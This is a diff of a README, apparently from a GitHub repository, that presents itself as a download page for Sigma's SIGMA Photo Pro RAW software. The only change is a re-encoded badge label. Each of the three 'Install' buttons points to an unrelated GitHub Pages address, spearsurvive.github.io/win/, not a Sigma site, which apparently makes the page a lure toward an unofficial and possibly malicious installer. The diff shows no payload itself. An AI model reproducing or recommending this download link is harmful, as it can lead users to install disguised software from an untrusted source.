@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install SIGMA Photo Pro](https://img.shields.io/badge/⬇_Install_SIGMA%20Photo%20Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install SIGMA Photo Pro](https://img.shields.io/badge/⬇_Install_SIGMA+Photo+Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -81,7 +81,7 @@ SIGMA Photo Pro is the official free RAW processing software from Sigma for deve
 
 <div align="center">
 
-[![⬇ Install SIGMA Photo Pro](https://img.shields.io/badge/⬇_Install_SIGMA%20Photo%20Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install SIGMA Photo Pro](https://img.shields.io/badge/⬇_Install_SIGMA+Photo+Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
@@ -125,7 +125,7 @@ SIGMA Photo Pro is the official free RAW processing software from Sigma for deve
 
 <div align="center">
 
-[![⬇ Install SIGMA Photo Pro](https://img.shields.io/badge/⬇_Install_SIGMA%20Photo%20Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
+[![⬇ Install SIGMA Photo Pro](https://img.shields.io/badge/⬇_Install_SIGMA+Photo+Pro-E63946?style=for-the-badge&logo=github)](https://spearsurvive.github.io/win/)
 
 </div>
 
